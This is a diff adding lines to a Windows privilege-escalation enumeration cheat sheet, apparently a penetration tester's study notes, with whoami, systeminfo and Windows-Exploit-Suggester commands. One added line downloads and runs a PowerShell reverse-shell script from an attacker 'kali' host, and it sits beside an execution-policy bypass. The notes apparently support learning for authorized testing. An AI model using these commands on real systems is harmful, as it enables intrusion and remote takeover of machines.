@@ -1,5 +1,29 @@
 ### Windows Priv-Esc Enumeration Flow (Post-Low-Priv Shell)
 
+whoami /all     # current user, SIDs, groups, privileges, and integrity level
+whoami /priv    # SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege, SeRestorePrivilege, SeLoadDriverPrivilege, SeManageVolumePrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeSystemEnvironmentPrivilege, SeShutdownPrivilege, SeEnableDelegationPrivilege, SeCreateTokenPrivilege
+echo %username% && hostname && pwd    # user, machine name, and current working dir
+systeminfo      # Ronseal
+systeminfo | findstr /C:"Domain"      # Check if Domain joined
+powershell -ep bypass    # Switch to PowerShell with execution policy bypassed for better scripting/interactivity
+//If PS unstable// powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://kali/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress kali_ip -Port 4444"`. (Upload script first if needed.)
+
+systeminfo > sysinfo.txt    # Dump systeminfo to file and review in Windows-Exploit-Suggester
+  python3 wes.py --update    # Update Windows-Exploit-Suggester
+  python3 wes.py sysinfo.txt    # Basic command for Windows-Exploit-Suggester
+  python3 wes.py systeminfo.txt --color    # Enable color mode in Windows-Exploit-Suggester
+  python3 wes.py systeminfo.txt --severity critical    # Filter for critical vulnerabilities only
+  python3 wes.py systeminfo.txt -i "Remote Code Execution"    #Filter for RCE only
+  python3 wes.py systeminfo.txt -i "Elevation Privilege"    #Filter for Priv Esc vectors only
+  python3 wes.py systeminfo.txt --output vulns.csv    # Determine vulnerabilities and output to file 
+  python3 wes.py systeminfo.txt --exploits-only    #  List only vulnerabilities with exploits
+
+
+
+
+
+
+
 After getting a reverse shell via Netcat (e.g., exploited vuln to download nc.exe from Kali), stabilize it first, then enumerate methodically. Focus on broad system context before targeted vectors. Document everything in a txt file on my Kali for the report. Iterate based on findings—if something looks vulnerable, exploit it before full enum.
 
 #### 1. Stabilize and Orient Shell
